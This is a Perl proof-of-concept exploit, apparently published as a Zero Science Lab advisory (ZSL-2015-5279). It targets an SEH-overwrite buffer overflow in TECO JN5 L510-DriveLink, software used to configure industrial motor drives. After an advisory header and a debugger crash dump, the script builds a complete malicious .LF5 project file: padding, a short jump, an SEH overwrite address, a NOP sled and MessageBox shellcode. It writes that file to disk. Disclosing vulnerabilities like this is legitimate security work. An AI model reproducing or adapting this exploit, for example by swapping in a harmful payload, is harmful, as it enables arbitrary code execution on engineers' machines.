@@ -1,0 +1,77 @@
+#!/usr/bin/perl
+#
+#
+# TECO JN5 L510-DriveLink 1.482 SEH Overwrite Buffer Overflow Exploit
+#
+#
+# Vendor: TECO Electric and Machinery Co., Ltd.
+# Product web page: http://www.teco-group.eu
+# Download: http://globalsa.teco.com.tw/support_download.aspx?KindID=9
+# Affected version: 1.482 and 1.462
+#
+# Summary: JN5 DriveLink is a free program that enables you to
+# configure the AC Motor Drive, 510 Series PC-Link. It provides
+# support for sleep and fire modes favourable for pumps, fans,
+# compressors, and HVAC and communication network protocol of
+# Modbus/ BACnet/ Metasys N2.
+#
+# Desc: The vulnerability is caused due to a boundary error in the
+# processing of a project file, which can be exploited to cause a
+# buffer overflow when a user opens e.g. a specially crafted .LF5 file.
+# Successful exploitation could allow execution of arbitrary code on
+# the affected machine.
+#
+# ---------------------------------------------------------------------------------
+# (14c0.12ec): Access violation - code c0000005 (first chance)
+# First chance exceptions are reported before any exception handling.
+# This exception may be expected and handled.
+# *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\system32\MFC42.DLL - 
+# *** WARNING: Unable to verify checksum for C:\Program Files (x86)\TECO\JN5 DriveLink\L510-DriveLink\L510-DriveLink.exe
+# *** ERROR: Module load completed but symbols could not be loaded for C:\Program Files (x86)\TECO\JN5 DriveLink\L510-DriveLink\L510-DriveLink.exe
+# eax=000026a0 ebx=0018f430 ecx=41414141 edx=00000001 esi=0018f408 edi=ffffd961
+# eip=70735d7e esp=0018f350 ebp=0018f364 iopl=0         nv up ei ng nz na po nc
+# cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00210282
+# MFC42!Ordinal2740+0xaa:
+# 70735d7e 8b01            mov     eax,dword ptr [ecx]  ds:002b:41414141=????????
+# 0:000> !exchain
+# 0018f3e4: 41414141
+# Invalid exception stack at 41414141
+# ---------------------------------------------------------------------------------
+#
+# Tested on: Microsoft Windows 7 Professional SP1 (EN) 64bit
+#            Microsoft Windows 7 Ultimate SP1 (EN) 64bit
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2015-5279
+# Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2015-5279.php
+#
+#
+# 09.10.2015]
+#
+
+
+my $header = "\x04\x00\x00\x00\x0A\x00\x00\x00\x4C\x35\x31\x30\x2D\x31".
+             "\x50\x32\x2D\x48\x0E\x00\x00\x00\x14\x00\x00\x00\x01\x00";
+
+# 113 bytes MessageBox shellcode
+my $sc = "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42".
+         "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03".
+         "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b".
+         "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e".
+         "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c".
+         "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x65\x64".
+         "\x21\x01\x68\x20\x50\x77\x6e\x68\x20\x5a\x53\x4c\x89\xe1\xfe".
+         "\x49\x0b\x31\xc0\x51\x50\xff\xd7";
+
+my $buffer = "A" x 43 . "\xEB\x06\x90\x90" . "\xB0\x5D\x40\x00" . "\x90" x 16 . $sc . "\x90" x 20 . "D" x 2627;
+
+my $file = "Gaming Nerdz.lf5";
+my $junk = $header.$buffer;
+open($FILE,">$file");
+print $FILE "$junk";
+close($FILE);
+print "Malicious LF5 file created successfully!\n";
